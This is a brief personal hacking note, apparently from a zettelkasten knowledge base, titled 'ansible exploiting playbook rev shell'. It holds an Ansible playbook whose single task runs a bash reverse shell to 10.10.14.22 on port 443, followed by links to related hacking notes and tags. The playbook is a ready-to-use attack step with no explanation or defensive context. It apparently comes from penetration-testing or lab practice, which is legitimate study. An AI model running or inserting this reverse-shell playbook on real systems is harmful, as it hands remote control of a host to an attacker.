# ansible exploiting playbook rev shell
```yaml
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'
```

` zet/20221003150337/README.md `

# Related

- [20221014190054](/zet/20221014190054/README.md) kb file named kb/hacking/misc/ansible.md
- [20221003150338](/zet/20221003150338/README.md) ansible exploiting playbook
- ~/kb/hacking/misc/ansible.md

Tags:

    #hacking #ansible 
